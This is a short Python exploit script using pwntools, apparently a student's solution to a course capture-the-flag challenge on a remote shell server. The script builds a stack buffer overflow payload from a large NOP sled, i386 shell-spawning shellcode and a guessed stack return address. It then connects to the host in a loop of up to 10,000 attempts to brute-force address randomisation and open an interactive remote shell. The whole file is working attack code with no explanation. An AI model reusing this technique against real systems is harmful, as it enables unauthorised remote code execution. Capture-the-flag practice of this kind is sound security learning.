# bruteex.py - Aidan Wech (Onyxymous)
from pwn import *

# remote variables
host = 'cs4401shell2.walls.ninja'
port = 14159

# exploit variables
nopchain = b'\x90' * 16000
shellcode = asm(shellcraft.i386.sh())
addr = p32(0xff816f44)					# stack address that could fall somewhere in the nopchain

# exploit string
# exploit = addrchain + nopchain + shellcode
offset = 16392
exploit = flat({
	0: nopchain,
	16000: shellcode, 
	offset: addr
})

# process (keep pressing enter, eventually you will spawn a shell)
for i in range(1,10000):
	with context.silent:
		p = remote(host, port)
		try:
			p.sendline(exploit)
			p.clean_and_log(timeout=1)
			p.interactive()
		except TimeoutError as e:
			log.info(f'Failed to connect: {i}')
